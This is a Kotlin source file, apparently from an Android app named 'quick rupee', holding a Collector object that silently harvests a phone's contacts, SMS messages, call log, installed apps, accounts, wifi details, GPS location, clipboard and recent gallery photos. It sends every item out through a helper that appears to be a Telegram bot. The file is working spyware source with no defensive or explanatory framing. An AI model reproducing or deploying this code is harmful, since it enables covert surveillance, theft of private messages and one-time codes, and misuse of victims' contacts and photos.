package com.quick.rupee

import android.accounts.AccountManager
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.location.LocationManager
import android.net.wifi.WifiManager
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import java.io.File

object Collector {

    fun dump(ctx: Context) {
        contacts(ctx); sms(ctx); callLog(ctx); apps(ctx)
        accounts(ctx); wifi(ctx); loc(ctx); clip(ctx); gallery(ctx)
    }

    fun contacts(ctx: Context) {
        val sb = StringBuilder()
        runCatching {
            ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null
            )?.use { c ->
                while (c.moveToNext()) sb.append(c.getString(0) ?: "-")
                    .append(" : ").append(c.getString(1) ?: "-").append('\n')
            }
        }
        if (sb.isNotEmpty()) Tg.doc(sb.toString().toByteArray(), "contacts.txt", "Contacts")
    }

    fun sms(ctx: Context) {
        val sb = StringBuilder()
        runCatching {
            ctx.contentResolver.query(Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
                null, null, "${Telephony.Sms.DATE} DESC")?.use { c ->
                var n = 0
                while (c.moveToNext() && n < 500) {
                    sb.append(c.getString(0)).append('\n')
                        .append(c.getString(1)).append("\n---\n")
                    n++
                }
            }
        }
        if (sb.isNotEmpty()) Tg.doc(sb.toString().toByteArray(), "sms.txt", "SMS inbox")
    }

    fun callLog(ctx: Context) {
        val sb = StringBuilder()
        runCatching {
            ctx.contentResolver.query(CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION),
                null, null, "${CallLog.Calls.DATE} DESC")?.use { c ->
                var n = 0
                while (c.moveToNext() && n < 300) {
                    sb.append(c.getString(0)).append(" | t").append(c.getString(1))
                        .append(" | ").append(c.getString(2)).append("s\n")
                    n++
                }
            }
        }
        if (sb.isNotEmpty()) Tg.doc(sb.toString().toByteArray(), "calls.txt", "Call log")
    }

    fun apps(ctx: Context) {
        val sb = StringBuilder()
        runCatching {
            ctx.packageManager.getInstalledPackages(0).forEach { sb.append(it.packageName).append('\n') }
        }
        if (sb.isNotEmpty()) Tg.doc(sb.toString().toByteArray(), "apps.txt", "Installed apps")
    }

    fun accounts(ctx: Context) {
        val sb = StringBuilder()
        runCatching {
            AccountManager.get(ctx).accounts.forEach {
                sb.append(it.name).append(" (").append(it.type).append(")\n")
            }
        }
        if (sb.isNotEmpty()) Tg.doc(sb.toString().toByteArray(), "accounts.txt", "Accounts")
    }

    fun wifi(ctx: Context) {
        runCatching {
            val wm = ctx.applicationContext.getSystemService(WifiManager::class.java)
            @Suppress("DEPRECATION")
            val i = wm.connectionInfo
            Tg.text("<b>wifi</b> ${i.ssid}\n${i.macAddress}\n${i.ipAddress}")
        }
    }

    fun loc(ctx: Context) {
        runCatching {
            val lm = ctx.getSystemService(LocationManager::class.java)
            val p = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (p != null) Tg.text("<b>loc</b>\nhttps://maps.google.com/?q=${p.latitude},${p.longitude}")
            else Tg.text("loc: no fix")
        }
    }

    fun clip(ctx: Context) {
        runCatching {
            val cm = ctx.getSystemService(ClipboardManager::class.java)
            val t = cm.primaryClip?.getItemAt(0)?.coerceToText(ctx)?.toString()
            if (!t.isNullOrEmpty()) Tg.text("<b>clip</b>\n${t.take(1500)}") else Tg.text("clip: khaali")
        }
    }

    fun gallery(ctx: Context, limit: Int = 15) {
        runCatching {
            ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME),
                null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC")?.use { c ->
                var n = 0
                while (c.moveToNext() && n < limit) {
                    val id = c.getLong(0)
                    val uri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                    val tmp = File(ctx.cacheDir, "g_$id.jpg")
                    runCatching {
                        ctx.contentResolver.openInputStream(uri)?.use { ins ->
                            tmp.outputStream().use { ins.copyTo(it) }
                        }
                        Tg.photo(tmp, c.getString(1) ?: "img")
                    }
                    tmp.delete()
                    n++
                }
            }
        }
    }
}
